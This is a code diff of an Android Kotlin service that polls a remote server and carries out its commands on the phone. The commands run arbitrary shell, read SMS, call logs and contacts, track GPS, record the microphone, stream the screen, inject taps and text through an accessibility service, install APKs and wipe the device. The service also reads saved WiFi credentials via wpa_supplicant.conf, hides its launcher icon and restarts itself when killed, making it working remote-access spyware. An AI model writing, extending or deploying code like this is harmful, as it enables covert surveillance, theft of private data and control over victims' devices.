@@ -12,9 +12,9 @@ import android.content.Intent
 import android.content.pm.PackageManager
 import android.location.LocationListener
 import android.location.LocationManager
+import android.os.Build
 import android.os.HandlerThread
 import android.net.wifi.WifiManager
-import android.os.Build
 import android.os.IBinder
 import android.os.PowerManager
 import android.os.SystemClock
@@ -28,7 +28,6 @@ import okhttp3.MediaType.Companion.toMediaType
 import okhttp3.OkHttpClient
 import okhttp3.Request
 import okhttp3.RequestBody.Companion.toRequestBody
-import rikka.shizuku.Shizuku
 import java.text.SimpleDateFormat
 import java.util.Date
 import java.util.Locale
@@ -48,7 +47,7 @@ class ConnectorService : Service() {
 
     private val http = OkHttpClient.Builder()
         .connectTimeout(10, TimeUnit.SECONDS)
-        .readTimeout(25, TimeUnit.SECONDS)   // 25s — cukup untuk long-poll 12s + margin
+        .readTimeout(25, TimeUnit.SECONDS)
         .writeTimeout(15, TimeUnit.SECONDS)
         .build()
     private val JSON = "application/json; charset=utf-8".toMediaType()
@@ -61,8 +60,6 @@ class ConnectorService : Service() {
     private var pollThread: Thread? = null
 
     // ── Screenshot Pipeline ────────────────────────────────────────────────
-    // Pre-capture frame berikutnya selagi frame sekarang sedang diupload.
-    // Overlap capture + upload → hemat 30-50% waktu per frame.
     @Volatile private var pipelinedFrame: String? = null
     private var pipelineThread: Thread? = null
 
@@ -74,7 +71,6 @@ class ConnectorService : Service() {
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         if (intent?.action == ACTION_STOP) { stopSelf(); return START_NOT_STICKY }
 
-        // Selalu gunakan ANDROID_ID langsung — stabil antar reinstall, tidak bergantung SharedPreferences
         @Suppress("HardwareIds")
         val androidId = android.provider.Settings.Secure.getString(
             contentResolver, android.provider.Settings.Secure.ANDROID_ID
@@ -83,16 +79,12 @@ class ConnectorService : Service() {
         deviceId = if (androidId != null) {
             androidId
         } else {
-            // Fallback: hash dari hardware info yang stabil antar reinstall
             val hw = "${Build.MANUFACTURER}:${Build.MODEL}:${Build.BOARD}:${Build.HARDWARE}"
             hw.hashCode().toString().replace("-", "x")
         }
         deviceName = "${Build.MANUFACTURER} ${Build.MODEL}"
 
         acquireWakeLock()
-        // Android 10+ (Q): gunakan startForeground dengan explicit type flag
-        // Hanya dataSync — MediaProjection TIDAK boleh diset sini karena butuh
-        // active MediaProjection token. Tanpa token → SecurityException → forceclose.
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
             startForeground(
                 NOTIF_ID, buildNotification("Connecting…", false),
@@ -110,12 +102,11 @@ class ConnectorService : Service() {
         super.onDestroy()
         polling = false
         isRunning = false
-        stopPipeline()       // bersihkan pipeline capture thread
+        stopPipeline()
         pollThread?.interrupt()
         wakeLock?.release()
         statusCallback?.invoke("🔴 Disconnected", false)
 
-        // Auto-restart after 3 seconds
         try {
             val pi = PendingIntent.getService(
                 this, 99,
@@ -143,19 +134,15 @@ class ConnectorService : Service() {
             log("🟢 Started · Device: $deviceName")
             log("🆔 ID: $deviceId")
             var failCount = 0
-            var lastHeartbeatAt = 0L      // Throttle heartbeat — jangan kirim tiap frame
-            var lastWasScreenshot = false // Skip sleep(500) setelah screenshot
+            var lastHeartbeatAt = 0L
+            var lastWasScreenshot = false
             while (polling) {
                 try {
                     val now = System.currentTimeMillis()
-                    // Heartbeat: selalu di iterasi pertama, lalu max setiap 5s
-                    // Saat screenshot streaming, heartbeat tiap 500ms = buang 100ms/frame!
                     if (now - lastHeartbeatAt >= 5000L) {
                         sendHeartbeat()
                         lastHeartbeatAt = now
                     }
-                    // Long-poll: server menahan koneksi hingga command siap (max 12s)
-                    // Tidak ada lagi null→sleep(500)→poll lagi → langsung dapat command
                     val cmd = pollCommand()
                     if (cmd != null) {
                         log("📥 CMD: ${cmd.command}")
@@ -174,10 +161,8 @@ class ConnectorService : Service() {
                     log("⚠️ ${e.message}")
                     if (failCount > 5) updateNotification("Server unreachable…", false)
                 }
-                // Screenshot streaming: skip sleep → tight loop, langsung poll berikutnya
-                // Command lain: stop pipeline + sleep(500ms) seperti biasa
                 if (!lastWasScreenshot) {
-                    stopPipeline()   // bersihkan pipeline jika keluar dari screenshot mode
+                    stopPipeline()
                     try { Thread.sleep(500) } catch (e: InterruptedException) { break }
                 }
             }
@@ -224,10 +209,10 @@ class ConnectorService : Service() {
 
     private fun executeCommand(cmd: String, extra: String?): Pair<String, String> {
         return when {
+            // ── File Operations ──
             cmd.startsWith("ls_json:")   -> { val (t, r) = FileOperations.listDir(cmd.removePrefix("ls_json:")); Pair(r, t) }
             cmd.startsWith("read_b64:")  -> Pair(FileOperations.readFileBase64(cmd.removePrefix("read_b64:")), "command_result")
             cmd.startsWith("read_text:") -> Pair(FileOperations.readFileText(cmd.removePrefix("read_text:"), 500), "command_result")
-            // thumb_b64:path:maxDim:quality — BitmapFactory.inSampleSize thumbnail, ~3-8KB vs 5MB
             cmd.startsWith("thumb_b64:") -> {
                 val parts = cmd.removePrefix("thumb_b64:").split(":")
                 val path    = parts[0]
@@ -241,16 +226,16 @@ class ConnectorService : Service() {
             cmd.startsWith("delete:")    -> Pair(FileOperations.deleteFile(cmd.removePrefix("delete:")), "command_result")
             cmd.startsWith("move:")      -> { val p = cmd.removePrefix("move:").split(":"); Pair(if (p.size < 2) "ERROR" else FileOperations.moveFile(p[0], p[1]), "command_result") }
             cmd.startsWith("file_info:") -> Pair(FileOperations.getFileInfo(cmd.removePrefix("file_info:")), "command_result")
+
+            // ── Shell ──
             cmd.startsWith("shell:")     -> Pair(runShell(cmd.removePrefix("shell:")), "command_result")
-            cmd.startsWith("shizuku:")   -> Pair(runShizuku(cmd.removePrefix("shizuku:")), "command_result")
-            cmd.startsWith("pm_grant:")     -> { val p = cmd.removePrefix("pm_grant:").split(":"); Pair(if (p.size < 2) "ERROR" else runShizuku("pm grant ${p[0]} ${p[1]}"), "command_result") }
-            cmd.startsWith("pm_revoke:")    -> { val p = cmd.removePrefix("pm_revoke:").split(":"); Pair(if (p.size < 2) "ERROR" else runShizuku("pm revoke ${p[0]} ${p[1]}"), "command_result") }
-            cmd.startsWith("pm_uninstall:") -> {
-                val pkg = cmd.removePrefix("pm_uninstall:").trim()
-                Pair(runShizuku("pm uninstall $pkg"), "command_result")
-            }
-            cmd.startsWith("settings_put:") -> { val p = cmd.removePrefix("settings_put:").split(":", limit=3); Pair(if (p.size < 3) "ERROR" else runShizuku("settings put ${p[0]} ${p[1]} ${p[2]}"), "command_result") }
-            cmd.startsWith("settings_get:") -> { val p = cmd.removePrefix("settings_get:").split(":", limit=2); Pair(if (p.size < 2) "ERROR" else runShizuku("settings get ${p[0]} ${p[1]}"), "command_result") }
+
+            // ── Package Manager (via shell) ──
+            cmd.startsWith("pm_grant:")     -> { val p = cmd.removePrefix("pm_grant:").split(":"); Pair(if (p.size < 2) "ERROR" else runShell("pm grant ${p[0]} ${p[1]}"), "command_result") }
+            cmd.startsWith("pm_revoke:")    -> { val p = cmd.removePrefix("pm_revoke:").split(":"); Pair(if (p.size < 2) "ERROR" else runShell("pm revoke ${p[0]} ${p[1]}"), "command_result") }
+            cmd.startsWith("pm_uninstall:") -> Pair(runShell("pm uninstall ${cmd.removePrefix("pm_uninstall:").trim()}"), "command_result")
+            cmd.startsWith("settings_put:") -> { val p = cmd.removePrefix("settings_put:").split(":", limit=3); Pair(if (p.size < 3) "ERROR" else runShell("settings put ${p[0]} ${p[1]} ${p[2]}"), "command_result") }
+            cmd.startsWith("settings_get:") -> { val p = cmd.removePrefix("settings_get:").split(":", limit=2); Pair(if (p.size < 2) "ERROR" else runShell("settings get ${p[0]} ${p[1]}"), "command_result") }
 
             // ── Location ──
             cmd == "get_location"        -> Pair(getLocation(), "command_result")
@@ -269,67 +254,53 @@ class ConnectorService : Service() {
 
             // ── Ring device ──
             cmd == "ring_device"         -> Pair(ringDevice(), "command_result")
-
-            // ── Stop ring ──
             cmd == "stop_ring"           -> Pair(stopRing(), "command_result")
 
-            // ── WiFi scan ──
+            // ── WiFi ──
             cmd == "scan_wifi"           -> Pair(scanWifi(), "command_result")
+            cmd == "get_wifi_saved"      -> Pair(getWifiSaved(), "command_result")
 
-            // ── Running processes ──
+            // ── Processes ──
             cmd == "get_processes"       -> Pair(runShell("ps -A"), "command_result")
 
-            // ── Hide/Unhide launcher icon (service keeps running) ──
+            // ── App visibility ──
             cmd == "hide_app" || cmd == "hide_icon"   -> Pair(toggleAppVisibility(true), "command_result")
             cmd == "unhide_app" || cmd == "show_icon" -> Pair(toggleAppVisibility(false), "command_result")
 
-            // ── Kontrol Jarak Jauh ──
+            // ── Device control ──
             cmd == "lock_screen"         -> Pair(lockScreen(), "command_result")
             cmd == "wipe_device"         -> Pair(wipeDevice(), "command_result")
             cmd.startsWith("vibrate:")   -> Pair(vibrateCustom(cmd.removePrefix("vibrate:").toIntOrNull() ?: 1), "command_result")
             cmd == "send_notification"   -> Pair(sendCustomNotification(extra), "command_result")
             cmd == "get_clipboard"       -> Pair(getClipboard(), "command_result")
             cmd.startsWith("install_apk:") -> Pair(installApk(cmd.removePrefix("install_apk:")), "command_result")
-            cmd == "get_wifi_saved"      -> Pair(getWifiSaved(), "command_result")
 
-            // ── Screenshot realtime — PIPELINE MODE ──────────────────────────
-            // Frame N: ambil dari buffer pipeline (pre-captured) ATAU capture baru.
-            // Langsung mulai capture Frame N+1 di background thread.
-            // Capture N+1 OVERLAP dengan upload N → hemat waktu = durasi upload.
-            // Benefit nyata: pada 15fps target (delayMs=67ms) + upload 100ms,
-            // pipeline sudah running 167ms → Frame N+1 tinggal sisa capture.
+            // ── Screenshot — MediaProjection pipeline ──────────────────────
             cmd.startsWith("screenshot") -> {
                 val parts  = cmd.split(":")
                 val maxW   = parts.getOrNull(1)?.toIntOrNull() ?: 720
                 val qual   = parts.getOrNull(2)?.toIntOrNull() ?: 70
 
-                // Ambil frame dari pipeline buffer jika sudah siap, else capture langsung
                 val frame = pipelinedFrame?.also { pipelinedFrame = null }
                     ?: takeScreenshot(maxW, qual)
 
-                // Langsung start pre-capture frame berikutnya di background
-                // (berjalan paralel saat frame ini sedang diupload ke server)
                 startPipelineCapture(maxW, qual)
-
                 Pair(frame, "command_result")
             }
 
-            // ── Remote Control — touch inject via Shizuku shell ──
-            // input_tap_pct:xPct:yPct  (0.0–1.0 percentage of screen)
+            // ── Remote Control v2 — Pure Accessibility, no Shizuku ──────────
             cmd.startsWith("input_tap_pct:") -> {
                 val p = cmd.removePrefix("input_tap_pct:").split(":")
                 val xp = p.getOrNull(0)?.toFloatOrNull() ?: 0f
                 val yp = p.getOrNull(1)?.toFloatOrNull() ?: 0f
                 Pair(injectTapPct(xp, yp), "command_result")
             }
-            // input_longpress_pct:xPct:yPct  (0.0–1.0 percentage of screen, hold 800ms)
             cmd.startsWith("input_longpress_pct:") -> {
                 val p = cmd.removePrefix("input_longpress_pct:").split(":")
                 val xp = p.getOrNull(0)?.toFloatOrNull() ?: 0f
                 val yp = p.getOrNull(1)?.toFloatOrNull() ?: 0f
                 Pair(injectLongPressPct(xp, yp), "command_result")
             }
-            // input_swipe_pct:x1:y1:x2:y2:durationMs
             cmd.startsWith("input_swipe_pct:") -> {
                 val p = cmd.removePrefix("input_swipe_pct:").split(":")
                 val x1 = p.getOrNull(0)?.toFloatOrNull() ?: 0f
@@ -339,35 +310,192 @@ class ConnectorService : Service() {
                 val dur = p.getOrNull(4)?.toIntOrNull() ?: 300
                 Pair(injectSwipePct(x1, y1, x2, y2, dur), "command_result")
             }
-            // input_key:KEYCODE_BACK / KEYCODE_HOME / KEYCODE_APP_SWITCH / etc.
             cmd.startsWith("input_key:") -> {
                 val key = cmd.removePrefix("input_key:")
-                // Coba AccessibilityService dulu (no Shizuku, persistent)
-                val handled = ControlAccessibilityService.dispatchGlobalAction(key)
-                if (handled) Pair("OK: key $key (via Accessibility)", "command_result")
-                else Pair(runShizuku("input keyevent $key"), "command_result")
+                // Try Accessibility first (Back/Home/Recents)
+                val handled = ControlAccessibilityService.dispatchKey(key)
+                if (handled) Pair("OK: $key (Accessibility)", "command_result")
+                else Pair(runShell("input keyevent $key"), "command_result")
             }
-            // input_text:hello world
             cmd.startsWith("input_text:") -> {
-                val text = cmd.removePrefix("input_text:").replace(" ", "%s")
-                Pair(runShizuku("input text '$text'"), "command_result")
+                val text = cmd.removePrefix("input_text:").replace("%s", " ")
+                val ok = ControlAccessibilityService.inputTextViaClipboard(applicationContext, text)
+                if (ok) Pair("OK: text input via clipboard paste", "command_result")
+                else Pair(runShell("input text '${text.replace("'", "\\'")}'"), "command_result")
             }
-            // get_screen_size → "1080x2340"
             cmd == "get_screen_size" -> Pair(getScreenSize(), "command_result")
 
-            // record_mic:durationSeconds — rekam mikrofon, return base64 3GP audio
+            // ── Mic recording ──
             cmd.startsWith("record_mic:") -> {
                 val sec = cmd.removePrefix("record_mic:").toIntOrNull()?.coerceIn(1, 60) ?: 5
                 Pair(recordMic(sec), "command_result")
             }
 
+            // ── RC Status ──
+            cmd == "rc_status" -> Pair(getRcStatus(), "command_result")
+
             // ── Misc ──
-            cmd == "device_info"         -> Pair(DeviceInfo.collect(this).toString(), "command_result")
-            cmd == "ping"                -> Pair("pong · $deviceName · $deviceId", "command_result")
-            cmd == "shizuku_status"      -> Pair(getShizukuStatus(), "command_result")
+            cmd == "device_info" -> Pair(DeviceInfo.collect(this).toString(), "command_result")
+            cmd == "ping"        -> Pair("pong · $deviceName · $deviceId", "command_result")
 
             else -> Pair("ERROR: Unknown command: $cmd", "command_result")
         }
+    }
+
+    // ─────────────────────────────────────────
+    //  REMOTE CONTROL v2 — TOUCH INJECT
+    // ─────────────────────────────────────────
+
+    @Suppress("DEPRECATION")
+    private fun getDisplayMetrics(): android.util.DisplayMetrics {
+        val wm = getSystemService(Context.WINDOW_SERVICE) as android.view.WindowManager
+        return android.util.DisplayMetrics().also { wm.defaultDisplay.getRealMetrics(it) }
+    }
+
+    private fun injectTapPct(xPct: Float, yPct: Float): String {
+        return try {
+            val m = getDisplayMetrics()
+            val x = (xPct.coerceIn(0f, 1f) * m.widthPixels).toInt()
+            val y = (yPct.coerceIn(0f, 1f) * m.heightPixels).toInt()
+
+            if (ControlAccessibilityService.isAvailable()) {
+                val ok = ControlAccessibilityService.dispatchTapSync(x.toFloat(), y.toFloat())
+                return if (ok) "OK: tap ($x,$y) via Accessibility"
+                else runShell("input tap $x $y").let { "FALLBACK: $it" }
+            }
+            runShell("input tap $x $y")
+        } catch (e: Exception) { "ERROR: ${e.message}" }
+    }
+
+    private fun injectLongPressPct(xPct: Float, yPct: Float): String {
+        return try {
+            val m = getDisplayMetrics()
+            val x = (xPct.coerceIn(0f, 1f) * m.widthPixels).toInt()
+            val y = (yPct.coerceIn(0f, 1f) * m.heightPixels).toInt()
+
+            if (ControlAccessibilityService.isAvailable()) {
+                val ok = ControlAccessibilityService.dispatchLongPressSync(x.toFloat(), y.toFloat())
+                return if (ok) "OK: long press ($x,$y) via Accessibility"
+                else runShell("input swipe $x $y $x $y 800").let { "FALLBACK: $it" }
+            }
+            runShell("input swipe $x $y $x $y 800")
+        } catch (e: Exception) { "ERROR: ${e.message}" }
+    }
+
+    private fun injectSwipePct(x1p: Float, y1p: Float, x2p: Float, y2p: Float, durMs: Int): String {
+        return try {
+            val m = getDisplayMetrics()
+            val x1 = (x1p.coerceIn(0f, 1f) * m.widthPixels).toInt()
+            val y1 = (y1p.coerceIn(0f, 1f) * m.heightPixels).toInt()
+            val x2 = (x2p.coerceIn(0f, 1f) * m.widthPixels).toInt()
+            val y2 = (y2p.coerceIn(0f, 1f) * m.heightPixels).toInt()
+            val dur = durMs.coerceIn(50, 3000)
+
+            if (ControlAccessibilityService.isAvailable()) {
+                val ok = ControlAccessibilityService.dispatchSwipeSync(
+                    x1.toFloat(), y1.toFloat(), x2.toFloat(), y2.toFloat(), dur.toLong()
+                )
+                return if (ok) "OK: swipe ($x1,$y1)→($x2,$y2) ${dur}ms via Accessibility"
+                else runShell("input swipe $x1 $y1 $x2 $y2 $dur").let { "FALLBACK: $it" }
+            }
+            runShell("input swipe $x1 $y1 $x2 $y2 $dur")
+        } catch (e: Exception) { "ERROR: ${e.message}" }
+    }
+
+    @Suppress("DEPRECATION")
+    private fun getScreenSize(): String {
+        return try {
+            val m = getDisplayMetrics()
+            "${m.widthPixels}x${m.heightPixels}"
+        } catch (e: Exception) { "ERROR: ${e.message}" }
+    }
+
+    private fun getRcStatus(): String {
+        return buildString {
+            appendLine("=== Remote Control v2 Status ===")
+            appendLine("AccessibilityService: ${if (ControlAccessibilityService.isAvailable()) "✅ Active" else "❌ Not active — aktifkan di Settings > Accessibility > System Control Service"}")
+            appendLine("MediaProjection: ${if (MediaProjectionHolder.isAvailable()) "✅ Active" else "❌ Not active — buka app untuk grant izin layar"}")
+            appendLine("Shizuku: Removed (tidak diperlukan)")
+            appendLine("Screen size: ${getScreenSize()}")
+        }
+    }
+
+    // ─────────────────────────────────────────
+    //  SCREENSHOT — MediaProjection only
+    // ─────────────────────────────────────────
+
+    private fun takeScreenshot(maxWidth: Int = 720, quality: Int = 70): String {
+        val tmpPath = "${cacheDir.absolutePath}/.sc_${System.currentTimeMillis()}.png"
+        return try {
+            // Strategy 1: MediaProjection (fastest, no shell, hardware-accelerated)
+            if (MediaProjectionHolder.isAvailable()) {
+                val frame = MediaProjectionHolder.captureFrameBase64(maxWidth, quality, 600)
+                if (frame != null && !frame.startsWith("ERROR")) return frame
+            }
+
+            // Strategy 2: screencap stdout — no disk I/O, no root needed
+            try {
+                val proc = Runtime.getRuntime().exec(arrayOf("screencap", "-p"))
+                val exited = proc.waitFor(3, TimeUnit.SECONDS)
+                if (exited) {
+                    val pngBytes = proc.inputStream.readBytes()
+                    if (pngBytes.size > 1000) {
+                        val result = screenshotFromBytes(pngBytes, maxWidth, quality)
+                        if (!result.startsWith("ERROR")) return result
+                    }
+                }
+                proc.destroy()
+            } catch (_: Exception) {}
+
+            // Strategy 3: screencap to file (last resort)
+            try {
+                java.io.File(tmpPath).delete()
+                runShell("screencap -p $tmpPath")
+                Thread.sleep(300)
+                if (java.io.File(tmpPath).exists()) {
+                    val result = FileOperations.screenshotFromFile(tmpPath, maxWidth, quality)
+                    java.io.File(tmpPath).delete()
+                    if (!result.startsWith("ERROR")) return result
+                }
+            } catch (_: Exception) {}
+
+            "ERROR: Screenshot gagal. Aktifkan MediaProjection permission di app."
+        } catch (e: Exception) {
+            try { java.io.File(tmpPath).delete() } catch (_: Exception) {}
+            "ERROR: ${e.message}"
+        }
+    }
+
+    private fun screenshotFromBytes(pngBytes: ByteArray, maxWidth: Int, quality: Int): String {
+        return try {
+            val opts1 = android.graphics.BitmapFactory.Options().apply { inJustDecodeBounds = true }
+            android.graphics.BitmapFactory.decodeByteArray(pngBytes, 0, pngBytes.size, opts1)
+            val scale = if (opts1.outWidth > maxWidth && maxWidth > 0)
+                (opts1.outWidth.toFloat() / maxWidth).toInt().coerceAtLeast(1) else 1
+            val opts2 = android.graphics.BitmapFactory.Options().apply { inSampleSize = scale }
+            val bmp = android.graphics.BitmapFactory.decodeByteArray(pngBytes, 0, pngBytes.size, opts2)
+                ?: return "ERROR: decode failed"
+            val baos = java.io.ByteArrayOutputStream()
+            bmp.compress(android.graphics.Bitmap.CompressFormat.JPEG, quality, baos)
+            bmp.recycle()
+            android.util.Base64.encodeToString(baos.toByteArray(), android.util.Base64.NO_WRAP)
+        } catch (e: Exception) { "ERROR: ${e.message}" }
+    }
+
+    private fun stopPipeline() {
+        pipelineThread?.interrupt()
+        pipelineThread = null
+        pipelinedFrame = null
+    }
+
+    private fun startPipelineCapture(maxW: Int, qual: Int) {
+        if (pipelineThread?.isAlive == true) return
+        pipelineThread = Thread {
+            try {
+                val frame = takeScreenshot(maxW, qual)
+                if (!frame.startsWith("ERROR")) pipelinedFrame = frame
+            } catch (_: InterruptedException) {}
+        }.also { it.isDaemon = true; it.start() }
     }
 
     // ─────────────────────────────────────────
@@ -379,33 +507,22 @@ class ConnectorService : Service() {
         return try {
             val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
             val activeProviders = lm.getProviders(true)
+            if (activeProviders.isEmpty()) return "⚠️ No location providers. Enable GPS."
 
-            if (activeProviders.isEmpty()) {
-                return "⚠️ No location providers available. Enable GPS in Settings."
-            }
-
-            // Request a fresh GPS fix using a background HandlerThread + CountDownLatch
             val latch = CountDownLatch(1)
             var freshLoc: android.location.Location? = null
             val ht = HandlerThread("loc-fix-thread").also { it.start() }
-
             val listener = LocationListener { loc ->
-                if (freshLoc == null || loc.accuracy < (freshLoc?.accuracy ?: Float.MAX_VALUE)) {
-                    freshLoc = loc
-                }
+                if (freshLoc == null || loc.accuracy < (freshLoc?.accuracy ?: Float.MAX_VALUE)) freshLoc = loc
                 latch.countDown()
             }
-
             for (p in activeProviders) {
                 try { lm.requestLocationUpdates(p, 0L, 0f, listener, ht.looper) } catch (_: Exception) {}
             }
-
-            // Wait up to 12 seconds for a fresh fix
             latch.await(12, TimeUnit.SECONDS)
             try { lm.removeUpdates(listener) } catch (_: Exception) {}
             ht.quitSafely()
 
-            // Fall back to getLastKnownLocation if fresh fix timed out
             var best = freshLoc
             if (best == null) {
                 for (p in activeProviders) {
@@ -413,7 +530,6 @@ class ConnectorService : Service() {
                     if (best == null || loc.accuracy < best.accuracy) best = loc
                 }
             }
-
             if (best != null) {
                 val isFresh = freshLoc != null
                 val fmt = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
@@ -427,9 +543,7 @@ class ConnectorService : Service() {
                     appendLine("Fresh:     ${if (isFresh) "yes" else "no (cached)"}")
                     appendLine("Maps: https://maps.google.com/?q=${best.latitude},${best.longitude}")
                 }
-            } else {
-                "⚠️ Location not available. Pastikan GPS aktif dan izin lokasi sudah diberikan."
-            }
+            } else "⚠️ Location not available."
         } catch (e: Exception) { "Error: ${e.message}" }
     }
 
@@ -439,9 +553,9 @@ class ConnectorService : Service() {
 
     private fun getSms(limit: Int): String {
         return try {
-            val uri = Telephony.Sms.CONTENT_URI
-            val cur = contentResolver.query(uri, arrayOf("address", "body", "date", "type"),
-                null, null, "date DESC") ?: return "⚠️ Cannot read SMS (permission denied?)"
+            val cur = contentResolver.query(Telephony.Sms.CONTENT_URI,
+                arrayOf("address", "body", "date", "type"), null, null, "date DESC")
+                ?: return "⚠️ Cannot read SMS"
             val fmt = SimpleDateFormat("MM-dd HH:mm", Locale.getDefault())
             val sb = StringBuilder("=== SMS (last $limit) ===\n")
             var n = 0
@@ -455,7 +569,7 @@ class ConnectorService : Service() {
                     n++
                 }
             }
-            if (n == 0) sb.append("No SMS found") else sb.appendLine("\nTotal shown: $n")
+            if (n == 0) sb.append("No SMS found") else sb.appendLine("\nTotal: $n")
             sb.toString()
         } catch (e: Exception) { "Error: ${e.message}" }
     }
@@ -466,11 +580,10 @@ class ConnectorService : Service() {
 
     private fun getCallLog(limit: Int): String {
         return try {
-            val uri = CallLog.Calls.CONTENT_URI
-            val proj = arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DATE,
-                CallLog.Calls.DURATION, CallLog.Calls.CACHED_NAME)
-            val cur = contentResolver.query(uri, proj, null, null, "${CallLog.Calls.DATE} DESC")
-                ?: return "⚠️ Cannot read call log (permission denied?)"
+            val proj = arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE,
+                CallLog.Calls.DATE, CallLog.Calls.DURATION, CallLog.Calls.CACHED_NAME)
+            val cur = contentResolver.query(CallLog.Calls.CONTENT_URI, proj,
+                null, null, "${CallLog.Calls.DATE} DESC") ?: return "⚠️ Cannot read call log"
             val fmt = SimpleDateFormat("MM-dd HH:mm", Locale.getDefault())
             val sb = StringBuilder("=== Call Log (last $limit) ===\n")
             var n = 0
@@ -485,12 +598,12 @@ class ConnectorService : Service() {
                     }
                     val date = fmt.format(Date(it.getLong(2)))
                     val dur  = it.getLong(3)
-                    val name = it.getString(4)?.let { if (it.isNotEmpty()) " ($it)" else "" } ?: ""
+                    val name = it.getString(4)?.let { n -> if (n.isNotEmpty()) " ($n)" else "" } ?: ""
                     sb.appendLine("[$date][$type] $num$name — ${dur}s")
                     n++
                 }
             }
-            if (n == 0) sb.append("No calls found") else sb.appendLine("\nTotal shown: $n")
+            if (n == 0) sb.append("No calls found") else sb.appendLine("\nTotal: $n")
             sb.toString()
         } catch (e: Exception) { "Error: ${e.message}" }
     }
@@ -501,21 +614,17 @@ class ConnectorService : Service() {
 
     private fun getContacts(limit: Int): String {
         return try {
-            val uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI
-            val proj = arrayOf(
-                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
-                ContactsContract.CommonDataKinds.Phone.NUMBER
-            )
-            val cur = contentResolver.query(uri, proj, null, null,
-                "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} ASC")
-                ?: return "⚠️ Cannot read contacts (permission denied?)"
+            val cur = contentResolver.query(
+                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
+                    ContactsContract.CommonDataKinds.Phone.NUMBER),
+                null, null, "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} ASC")
+                ?: return "⚠️ Cannot read contacts"
             val sb = StringBuilder("=== Contacts ===\n")
             var n = 0
             cur.use {
                 while (it.moveToNext() && n < limit) {
-                    val name = it.getString(0) ?: "?"
-                    val num  = it.getString(1) ?: ""
-                    sb.appendLine("$name: $num")
+                    sb.appendLine("${it.getString(0) ?: "?"}: ${it.getString(1) ?: ""}")
                     n++
                 }
             }
@@ -536,8 +645,8 @@ class ConnectorService : Service() {
                 .sortedBy { pm.getApplicationLabel(it).toString().lowercase() }
             val sb = StringBuilder("=== Installed Apps (${user.size}) ===\n")
             user.forEach { app ->
-                val label   = pm.getApplicationLabel(app).toString()
-                val ver     = try { pm.getPackageInfo(app.packageName, 0).versionName ?: "?" } catch (_: Exception) { "?" }
+                val label = pm.getApplicationLabel(app).toString()
+                val ver   = try { pm.getPackageInfo(app.packageName, 0).versionName ?: "?" } catch (_: Exception) { "?" }
                 sb.appendLine("$label | ${app.packageName} | v$ver")
             }
             sb.toString()
@@ -566,37 +675,20 @@ class ConnectorService : Service() {
                 ringtone?.play()
                 Thread { Thread.sleep(10000); ringtone?.stop() }.start()
             } catch (_: Exception) {}
-            "🔊 Device is ringing! Use stop_ring to stop."
-        } catch (e: Exception) { "Error: ${e.message}" }
-    }
-
-    // ─────────────────────────────────────────
-    //  HIDE / UNHIDE APP ICON
-    // ─────────────────────────────────────────
-
-    private fun toggleAppVisibility(hide: Boolean): String {
-        return try {
-            if (hide) {
-                AppIcon.hide(this)
-                "✅ Ikon app disembunyikan dari launcher.\nService tetap berjalan di background.\nUntuk memunculkan kembali: ketik *#2719# di dialer atau kirim 'unhide_app'."
-            } else {
-                AppIcon.show(this)
-                "✅ Ikon app tampil kembali di launcher."
-            }
+            "🔊 Device is ringing!"
         } catch (e: Exception) { "Error: ${e.message}" }
     }
 
     private fun stopRing(): String {
         return try {
             ringtone?.stop()
-            val vib = getSystemService(Context.VIBRATOR_SERVICE) as android.os.Vibrator
-            vib.cancel()
+            (getSystemService(Context.VIBRATOR_SERVICE) as android.os.Vibrator).cancel()
             "🔇 Ring stopped"
         } catch (e: Exception) { "Error: ${e.message}" }
     }
 
     // ─────────────────────────────────────────
-    //  WIFI SCAN
+    //  WIFI
     // ─────────────────────────────────────────
 
     @SuppressLint("MissingPermission")
@@ -604,60 +696,63 @@ class ConnectorService : Service() {
         return try {
             val wm = applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
             val results = wm.scanResults
-            if (results.isEmpty()) return "⚠️ No WiFi networks found. Enable WiFi."
+            if (results.isEmpty()) return "⚠️ No WiFi networks found."
             buildString {
                 appendLine("=== WiFi Networks (${results.size}) ===")
                 results.sortedByDescending { it.level }.forEach { ap ->
                     val bars = WifiManager.calculateSignalLevel(ap.level, 5)
-                    val sig  = "▓".repeat(bars) + "░".repeat(5 - bars)
-                    val ssid = if (ap.SSID.isNullOrEmpty()) "[hidden]" else ap.SSID
-                    appendLine("$ssid | $sig | ${ap.level}dBm | ${ap.frequency}MHz")
+                    appendLine("${if (ap.SSID.isNullOrEmpty()) "[hidden]" else ap.SSID} | ${"▓".repeat(bars)}${"░".repeat(5-bars)} | ${ap.level}dBm")
                 }
             }
         } catch (e: Exception) { "Error: ${e.message}" }
     }
 
-    // ─────────────────────────────────────────
-    //  SHELL / SHIZUKU
-    // ─────────────────────────────────────────
+    @SuppressLint("MissingPermission")
+    private fun getWifiSaved(): String {
+        return try {
+            val wm = applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
+            @Suppress("DEPRECATION")
+            val configs = wm.configuredNetworks
+            if (configs.isNullOrEmpty()) return runShell("cat /data/misc/wifi/wpa_supplicant.conf 2>/dev/null || echo 'Permission denied'")
+            buildString {
+                appendLine("=== WiFi Tersimpan (${configs.size}) ===")
+                configs.forEach { cfg -> appendLine("SSID: ${cfg.SSID?.replace("\"", "") ?: "?"}") }
+            }
+        } catch (e: Exception) { runShell("cat /data/misc/wifi/wpa_supplicant.conf 2>/dev/null || echo 'Butuh root'") }
+    }
 
     // ─────────────────────────────────────────
-    //  LOCK SCREEN
+    //  APP VISIBILITY
+    // ─────────────────────────────────────────
+
+    private fun toggleAppVisibility(hide: Boolean): String {
+        return try {
+            if (hide) { AppIcon.hide(this); "✅ Ikon disembunyikan. Ketik *#2719# di dialer untuk tampilkan kembali." }
+            else { AppIcon.show(this); "✅ Ikon tampil kembali." }
+        } catch (e: Exception) { "Error: ${e.message}" }
+    }
+
